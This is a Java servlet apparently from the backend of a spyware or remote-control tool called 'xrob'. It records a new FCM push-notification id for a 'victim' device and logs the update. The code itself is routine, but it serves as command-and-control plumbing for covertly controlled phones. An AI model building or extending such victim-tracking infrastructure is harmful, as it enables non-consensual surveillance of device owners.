package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.database.tables.Victims;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.utils.APIResponse;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * Created by theapache64 on 12/9/16.
 */
@WebServlet(urlPatterns = {AdvancedBaseServlet.VERSION_CODE + "/update/fcm"})
public class FCMUpdateServlet extends AdvancedBaseServlet {

    @Override
    protected boolean isSecureServlet() {
        return true;
    }

    @Override
    protected String[] getRequiredParameters() {
        return new String[]{Victims.COLUMN_FCM_ID};
    }

    @Override
    protected void doAdvancedPost() throws Exception {
        final String fcmId = getStringParameter(Victims.COLUMN_FCM_ID);
        final String victimId = getHeaderSecurity().getVictimId();

        final boolean isUpdated = Victims.getInstance().update(Victims.COLUMN_ID, victimId, Victims.COLUMN_FCM_ID, fcmId);

        if (isUpdated) {
            Deliveries.getInstance().add(new Delivery(victimId, false, "FCM Update", Delivery.TYPE_OTHER, 0));
            getWriter().write(new APIResponse("success", null).getResponse());
        } else {
            Deliveries.getInstance().add(new Delivery(victimId, true, "FCM Update failed", Delivery.TYPE_OTHER, 0));
            throw new RuntimeException("Failed to update the FCM id");
        }
    }
}
